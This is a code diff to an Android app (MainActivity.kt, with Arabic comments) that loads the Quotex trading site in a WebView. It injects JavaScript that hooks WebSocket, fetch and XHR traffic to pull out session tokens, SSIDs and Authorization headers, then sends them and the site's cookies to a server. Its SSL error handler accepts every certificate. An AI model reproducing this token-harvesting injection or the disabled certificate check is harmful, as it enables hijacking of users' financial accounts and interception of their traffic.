@@ -74,7 +74,7 @@ class MainActivity : AppCompatActivity() {
     private val QX_DOMAIN = "https://quotex.com"
 
     // ═══════════════════════════════════════════════════════════
-    // سكربت الحقن المبكر - يعمل قبل أي JS في الصفحة
+    // سكربت الحقن - النسخة المُصححة (يستخرج SSID من send أيضاً)
     // ═══════════════════════════════════════════════════════════
     private val EARLY_HOOK_JS = """
     (function() {
@@ -82,16 +82,16 @@ class MainActivity : AppCompatActivity() {
         window.__oscarEarlyHook = true;
         window.__oscarFrames = [];
 
-        function forwardFrame(text) {
+        function extractAndSend(text, tag) {
             try {
                 if (typeof text !== 'string' || text.length < 5) return;
                 if (window.__oscarFrames.length < 200) {
-                    window.__oscarFrames.push(text.substring(0, 3000));
+                    window.__oscarFrames.push('[' + tag + '] ' + text.substring(0, 3000));
                 }
                 if (window.OscarBridge && window.OscarBridge.onFrame) {
-                    window.OscarBridge.onFrame(text.substring(0, 3000));
+                    window.OscarBridge.onFrame('[' + tag + '] ' + text.substring(0, 3000));
                 }
-                // Try extract patterns
+                // ★★★ استخراج SSID من كل من send و message ★★★
                 var pats = [
                     /"session"\s*:\s*"([^"]+)"/,
                     /"token"\s*:\s*"([^"]+)"/,
@@ -113,23 +113,20 @@ class MainActivity : AppCompatActivity() {
             } catch(e) {}
         }
 
-        function processData(d) {
+        function processIncoming(d) {
             try {
-                if (typeof d === 'string') { forwardFrame(d); return; }
-                if (d instanceof Blob) { d.text().then(forwardFrame); return; }
+                if (typeof d === 'string') { extractAndSend(d, 'WS_RECV'); return; }
+                if (d instanceof Blob) { d.text().then(function(t){ extractAndSend(t, 'WS_RECV'); }); return; }
                 if (d instanceof ArrayBuffer) {
                     try {
                         var txt = new TextDecoder('utf-8').decode(d);
-                        forwardFrame(txt);
+                        extractAndSend(txt, 'WS_RECV');
                     } catch(e) {
                         var bytes = new Uint8Array(d);
                         var s = '';
-                        for (var i = 0; i < bytes.length && i < 3000; i++) {
-                            s += String.fromCharCode(bytes[i]);
-                        }
-                        forwardFrame(s);
+                        for (var i = 0; i < bytes.length && i < 3000; i++) s += String.fromCharCode(bytes[i]);
+                        extractAndSend(s, 'WS_RECV');
                     }
-                    return;
                 }
             } catch(e) {}
         }
@@ -138,16 +135,16 @@ class MainActivity : AppCompatActivity() {
         if (OWS) {
             var HookedWS = function(url, protocols) {
                 try {
+                    if (url && window.OscarBridge && window.OscarBridge.onFrame) {
+                        window.OscarBridge.onFrame('[WS_URL] ' + url.substring(0, 500));
+                    }
                     if (url) {
-                        if (window.OscarBridge && window.OscarBridge.onFrame) {
-                            window.OscarBridge.onFrame('[WS_URL] ' + url.substring(0, 500));
-                        }
-                        var pats = [/[?&]token=([^&]+)/, /[?&]session=([^&]+)/, /[?&]ssid=([^&]+)/];
-                        for (var i = 0; i < pats.length; i++) {
-                            var m = url.match(pats[i]);
-                            if (m && m[1] && m[1].length > 25) {
+                        var upats = [/[?&]token=([^&]+)/, /[?&]session=([^&]+)/, /[?&]ssid=([^&]+)/];
+                        for (var i = 0; i < upats.length; i++) {
+                            var um = url.match(upats[i]);
+                            if (um && um[1] && um[1].length > 25) {
                                 if (window.OscarBridge && window.OscarBridge.onSsid) {
-                                    window.OscarBridge.onSsid(decodeURIComponent(m[1]));
+                                    window.OscarBridge.onSsid(decodeURIComponent(um[1]));
                                 }
                             }
                         }
@@ -158,18 +155,14 @@ class MainActivity : AppCompatActivity() {
                     var origAdd = ws.addEventListener.bind(ws);
                     ws.addEventListener = function(type, listener, opts) {
                         if (type === 'message') {
-                            var wrapped = function(ev) {
-                                processData(ev.data);
+                            return origAdd(type, function(ev) {
+                                processIncoming(ev.data);
                                 return listener(ev);
-                            };
-                            return origAdd(type, wrapped, opts);
+                            }, opts);
                         }
                         return origAdd(type, listener, opts);
                     };
                     ws.onmessage = null;
-                    ws.addEventListener('open', function() {
-                        if (window.OscarBridge) window.OscarBridge.onFrame('[WS_OPEN]');
-                    });
                 } catch(e){}
                 return ws;
             };
@@ -179,7 +172,20 @@ class MainActivity : AppCompatActivity() {
             window.WebSocket = HookedWS;
         }
 
-        // Intercept fetch
+        // ★★★ الإصلاح الحاسم: اعتراض send واستخراج SSID ★★★
+        if (window.WebSocket && window.WebSocket.prototype && window.WebSocket.prototype.send) {
+            var origSend = window.WebSocket.prototype.send;
+            window.WebSocket.prototype.send = function(data) {
+                try {
+                    if (typeof data === 'string') {
+                        extractAndSend(data, 'WS_SEND');
+                    }
+                } catch(e){}
+                return origSend.apply(this, arguments);
+            };
+        }
+
+        // اعتراض fetch للـ Authorization headers
         var origFetch = window.fetch;
         if (origFetch) {
             window.fetch = function() {
@@ -198,7 +204,7 @@ class MainActivity : AppCompatActivity() {
             };
         }
 
-        // Intercept XHR
+        // اعتراض XHR
         var OrigXHR = window.XMLHttpRequest;
         if (OrigXHR) {
             var origSetHeader = OrigXHR.prototype.setRequestHeader;
@@ -212,19 +218,6 @@ class MainActivity : AppCompatActivity() {
                     }
                 } catch(e){}
                 return origSetHeader.apply(this, arguments);
-            };
-        }
-
-        // Intercept WebSocket send (to catch outgoing auth messages)
-        if (window.WebSocket && window.WebSocket.prototype && window.WebSocket.prototype.send) {
-            var origSend = window.WebSocket.prototype.send;
-            window.WebSocket.prototype.send = function(data) {
-                try {
-                    if (typeof data === 'string' && window.OscarBridge && window.OscarBridge.onFrame) {
-                        window.OscarBridge.onFrame('[WS_SEND] ' + data.substring(0, 1500));
-                    }
-                } catch(e){}
-                return origSend.apply(this, arguments);
             };
         }
     })();
@@ -693,7 +686,7 @@ class MainActivity : AppCompatActivity() {
         sb.append("=== CAPTURED SSIDs (${capturedSsids.size}) ===\n")
         capturedSsids.take(10).forEach { sb.append("• ${it.take(100)}\n") }
         sb.append("\n=== CAPTURED FRAMES (${capturedFrames.size}) ===\n")
-        capturedFrames.take(15).forEachIndexed { i, f ->
+        capturedFrames.take(20).forEachIndexed { i, f ->
             sb.append("[${i+1}] ${f.take(400)}\n\n")
         }
         sb.append("\n=== COOKIES ===\n")
@@ -728,24 +721,6 @@ class MainActivity : AppCompatActivity() {
         CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
         webView.addJavascriptInterface(Bridge(), "OscarBridge")
 
-        // ═════════════════════════════════════════════════════
-        // الحقن المبكر لـ API 26+
-        // ═════════════════════════════════════════════════════
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            try {
-                webView.evaluateJavascript(EARLY_HOOK_JS, null)
-                // Try document start injection
-                // (best-effort — may not exist in all WebView versions)
-                try {
-                    val method = WebView::class.java.getMethod(
-                        "addDocumentStartJavaScript", String::class.java, Set::class.java)
-                    method.invoke(webView, EARLY_HOOK_JS, emptySet<String>())
-                } catch (e: Exception) {
-                    Log.d("OscarInit", "addDocumentStartJavaScript not available: ${e.message}")
-                }
-            } catch (e: Exception) {}
-        }
-
         webView.webViewClient = object : WebViewClient() {
             override fun onReceivedSslError(v: WebView?, h: SslErrorHandler?, e: android.net.http.SslError?) {
                 h?.proceed()
@@ -753,16 +728,13 @@ class MainActivity : AppCompatActivity() {
             override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
                 super.onPageStarted(view, url, favicon)
                 if (url?.contains("quotex.com") == true) {
-                    // Inject as early as possible
                     view?.evaluateJavascript(EARLY_HOOK_JS, null)
                 }
             }
             override fun onPageFinished(view: WebView, url: String) {
                 super.onPageFinished(view, url)
                 if (url.contains("quotex.com")) {
-                    // Re-inject (in case onPageStarted missed)
                     view.evaluateJavascript(EARLY_HOOK_JS, null)
-                    // If user is logged in and we're on trade page, try capture
                     if (linkingMode && (url.contains("/trade") || url.contains("/cabinet") || url.contains("/dashboard"))) {
                         statusBar.text = "✅ تم اكتشاف تسجيل الدخول — جاري البحث عن SSID..."
                         Handler(Looper.getMainLooper()).postDelayed({ autoSendCookie() }, 3000)
@@ -776,13 +748,11 @@ class MainActivity : AppCompatActivity() {
 
     private fun autoSendCookie() {
         if (!linkingMode) return
-        // إذا كان لدينا SSID من WebSocket، أرسله كأولوية
         val ssid = capturedSsids.lastOrNull()
         if (ssid != null && ssid.length > 25) {
             sendToServer(ssid, "")
             return
         }
-        // احتياطي: أرسل الكوكيز كما هي
         if (cookieSent) return
         val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: ""
         if (cookies.isBlank()) return
@@ -821,7 +791,6 @@ class MainActivity : AppCompatActivity() {
                         val err = json.optString("error", "خطأ")
                         statusBar.text = "⚠️ فشل: $err"
                         cookieSent = false
-                        // Try next captured SSID if available
                         val untried = capturedSsids.filter { it != ssid }
                         if (untried.isNotEmpty() && ssid.isNotEmpty()) {
                             Handler(Looper.getMainLooper()).postDelayed({
@@ -858,7 +827,7 @@ class MainActivity : AppCompatActivity() {
                 Log.d("OscarSSID", "Captured: ${ssid.take(100)}")
                 runOnUiThread {
                     if (linkingMode) {
-                        statusBar.text = "🎯 تم التقاط SSID! (${ssid.length} حرف) — جاري التحقق..."
+                        statusBar.text = "🎯 تم التقاط SSID! (${ssid.length} حرف)"
                         sendToServer(ssid, "")
                     }
                 }
